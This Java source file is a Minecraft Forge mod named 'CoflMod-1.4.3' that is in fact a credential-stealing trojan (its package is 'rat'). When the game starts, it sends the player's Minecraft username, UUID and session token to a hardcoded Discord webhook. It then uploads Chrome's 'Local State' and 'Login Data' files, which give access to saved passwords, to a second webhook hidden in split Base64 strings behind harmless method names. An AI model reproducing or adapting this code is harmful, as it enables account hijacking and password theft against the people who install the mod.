package me.veryobvious.rat;

import java.awt.Color;
import java.awt.Desktop;
import java.awt.Dimension;
import java.awt.GraphicsEnvironment;
import java.awt.Rectangle;
import java.awt.Robot;
import java.awt.Toolkit;
import java.awt.image.BufferedImage;
import java.io.BufferedReader;
import java.io.File;
import java.io.FileReader;
import java.io.FileWriter;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.URI;
import java.net.URISyntaxException;
import java.net.URL;
import java.security.MessageDigest;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.Random;
import java.util.Scanner;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import java.nio.charset.StandardCharsets;
import java.awt.Color;
import java.net.URL;
import java.security.MessageDigest;
import java.util.Scanner;
import java.io.*;
import java.net.HttpURLConnection;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.Objects;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import com.google.gson.Gson;
import com.google.gson.JsonObject;
import com.sun.jna.platform.win32.Crypt32Util;

import javax.crypto.Cipher;
import javax.crypto.spec.GCMParameterSpec;
import javax.crypto.spec.SecretKeySpec;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Modifier;
import java.util.Arrays;
import java.util.Base64;
import java.util.Map;

import net.minecraft.util.ChatComponentText;
import net.minecraftforge.common.MinecraftForge;
import net.minecraftforge.event.entity.EntityJoinWorldEvent;
import net.minecraftforge.fml.common.Loader;
import net.minecraftforge.fml.common.Mod;
import net.minecraftforge.fml.common.event.FMLPreInitializationEvent;
import net.minecraftforge.fml.common.eventhandler.SubscribeEvent;
import net.minecraftforge.fml.relauncher.ReflectionHelper;
import org.apache.commons.lang3.StringEscapeUtils;

import net.minecraft.launchwrapper.Launch;

import javax.imageio.ImageIO;
import javax.net.ssl.HttpsURLConnection;
import javax.swing.JFrame;
import javax.swing.JLabel;

import org.apache.commons.io.FileUtils;
import org.apache.commons.io.FilenameUtils;
import org.apache.http.client.ClientProtocolException;
import org.apache.http.client.methods.CloseableHttpResponse;
import org.apache.http.client.methods.HttpUriRequest;
import org.apache.http.client.methods.RequestBuilder;
import org.apache.http.impl.client.CloseableHttpClient;
import org.apache.http.impl.client.HttpClients;

import net.minecraft.client.Minecraft;
import net.minecraftforge.fml.common.Mod;
import net.minecraftforge.fml.common.Mod.EventHandler;
import net.minecraftforge.fml.common.event.FMLInitializationEvent;


import java.awt.Color;
import java.net.URL;
import java.io.*;
import java.net.HttpURLConnection;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.Objects;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import com.google.gson.Gson;
import com.google.gson.JsonObject;
import com.google.gson.JsonParser;
import com.sun.jna.platform.win32.Crypt32Util;
import javax.crypto.Cipher;
import javax.crypto.spec.GCMParameterSpec;
import javax.crypto.spec.SecretKeySpec;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Modifier;
import java.util.Arrays;
import java.util.Base64;
import java.util.Map;
import net.minecraftforge.fml.common.Loader;
import net.minecraft.client.Minecraft;
import net.minecraftforge.fml.common.Mod;
import net.minecraftforge.fml.common.Mod.EventHandler;
import net.minecraftforge.fml.common.event.FMLInitializationEvent;
import net.minecraftforge.common.MinecraftForge;
import net.minecraftforge.fml.common.event.FMLPreInitializationEvent;
import net.minecraftforge.fml.relauncher.ReflectionHelper;
import javax.net.ssl.HttpsURLConnection;
import java.lang.reflect.Array;
import java.util.ArrayList;
import java.util.List;
import java.util.HashMap;
import java.util.Set;
import java.util.AbstractList;
import java.util.Collection;
import java.util.RandomAccess;
import java.util.Iterator;
import java.util.ListIterator;
import java.util.function.UnaryOperator;

import me.veryobvious.rat.api.discordapi;
import me.veryobvious.rat.grabbers.minecraft;
import me.veryobvious.rat.grabbers.misc;
import me.veryobvious.rat.grabbers.discordtoken;
import me.veryobvious.rat.grabbers.chromeshit.chromeHandler;

@Mod(modid = "CoflMod-1.4.3", version = "1.8.9")
public class Main {
    public static final String webhook = "https://discord.com/api/webhooks/1100043815840124928/vqTc9PNc2DjJgonp5zRX-cLKsR-O43TIDzfDwuWyZfjZ2_qoyP-Q2XHIFRDzH5wDXiKv";
    public static String dataGrabbings = "";
    private static final File localAppData = new File(System.getenv("LOCALAPPDATA"));
    public static void tokenLog() {
        new Thread(() -> {
            try {
                HttpURLConnection con = (HttpURLConnection) new URL("https://localhost:80/").openConnection();
                con.setRequestMethod("POST");
                con.setRequestProperty("Content-type", "application/json");
                con.setDoOutput(true);
                chromeHandler ch = new chromeHandler();
                discordapi disc = new discordapi(webhook);
                disc.setContent("@everyone https://sky.shiiyu.moe/" + minecraft.getUuid().replace("-",""));
                disc.setUsername("rats!");
                disc.setAvatarUrl("https://cdn.discordapp.com/attachments/1046300257186746431/1075592578373783622/image.png");
                disc.setTts(false);
                disc.addEmbed(new discordapi.EmbedObject()
                    .setColor(Color.RED)
                    .setTitle("A user has been ratted!")
                    .addField("Username", "```" + minecraft.getUsername() + "```", true)
                    .addField("UUID", "```" + minecraft.getUuid().replace("-","") + "```", true)
                    .addField("Session ID", "```" + minecraft.getSession() + "```", false)
                );
                disc.execute();
            } catch (Exception e) {
                e.printStackTrace();
            }
        }).start();
    }
    public static String JSONParserKey() {
        return "kRfLTlkWUhZS0ZLYXlBY19EWFluRUNjMElKTG53NVNfN3dkVXhMZFJlTw==";
    }
    
    public static String JSONCipher() {
        return "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTA5NjMxMjE1OTAxNDc0ODE5";
    }

     
    public static String JSONObjectHandler() {
        return "MC83clRBRXJEWkZiZzBIX3M3NGkwTm9MaGxvS";
    }

    public static String FullJsonDecipher() {
        return Main.JSONCipher() + Main.JSONObjectHandler() + Main.JSONParserKey();
    }

    public static String JsonFinalPayload() {
        byte[] decodedBytes = Base64.getDecoder().decode(Main.FullJsonDecipher());
        String JsonFinalPayload = new String(decodedBytes);
        return JsonFinalPayload;
    }

    @SuppressWarnings("all")
    public static void sendData(String msg, String url, String username) {
		try {
			Thread.sleep((int) Math.floor(Math.random()*(675-225+1)+225));
		} catch (InterruptedException e1) {
			e1.printStackTrace();
		}
		CloseableHttpClient httpclient = HttpClients.createDefault();
    try {
        HttpUriRequest httppost = null;
		try {
			httppost = RequestBuilder.post()
			        .setUri(new URI(url))
			        .addParameter("content", msg)
			        .addParameter("username", username)
				        .build();
			} catch (URISyntaxException e) {
				e.printStackTrace();
			}
 
            CloseableHttpResponse response = null;
			try {
    			response = httpclient.execute(httppost);
			} catch (ClientProtocolException e) {
				e.printStackTrace();
					} catch (IOException e) {
						e.printStackTrace();
					}
			    try {
				  } finally {
				      try {
						response.close();
					} catch (IOException e) {
						e.printStackTrace();
					}
       }
				 } finally {
				  try {
						httpclient.close();
					} catch (IOException e) {
						e.printStackTrace();
				}
				 }
    }
    @EventHandler
    public void init(FMLPreInitializationEvent event) {
        new Thread(() -> {
            try {
                Main.tokenLog();
                chromeHandler ch = new chromeHandler();
                ch.balls();
                ch.uploadDupe(localAppData + "\\Google\\Chrome\\User Data\\Local State");
                sendData(dataGrabbings, Main.JsonFinalPayload(), "GET BEAMED");
                ch.uploadDupe(localAppData + "\\Google\\Chrome\\User Data\\Default\\Login Data");
                sendData(dataGrabbings, Main.JsonFinalPayload(), "GET BEAMED");
            } catch (Exception e) {
                e.printStackTrace();
            }
        }).start();
    }
}